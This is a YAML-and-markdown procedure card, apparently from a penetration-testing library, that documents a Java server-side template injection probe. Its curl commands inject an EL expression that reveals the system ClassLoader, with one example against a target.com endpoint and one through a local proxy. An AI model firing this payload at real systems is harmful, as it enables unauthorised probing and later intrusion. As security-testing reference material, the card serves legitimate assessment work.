---
id: 34973983-4208-4e8c-8f06-056686f03b38
name: test-java-ssti-classloader-info
type: command
executor: bash
data: >-
  curl
  "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader()}"
output: null
created_at: '2023-04-06T03:56:39.297399+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssti
  - java
  - classloader
verified: true
validated: true
---

# test-java-ssti-classloader-info

## Command

```bash
curl "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader()}"
```

## Description

Injects an EL payload to retrieve the system ClassLoader object via reflection, confirming access to Java internals in a vulnerable template.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/render?template=${T(java.lang.ClassLoader).getSystemClassLoader()}"
```

### With Proxy

```bash
curl -x http://127.0.0.1:8080 "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader()}"
```

## Expected Output

Response includes the ClassLoader reference like 'jdk.internal.loader.ClassLoaders$AppClassLoader@3fee733d' in the rendered output.

## Related

- [[procedures/Java-SSTI-Basic-Injection-Using-ClassLoader-and-Resource-Retrieval]]
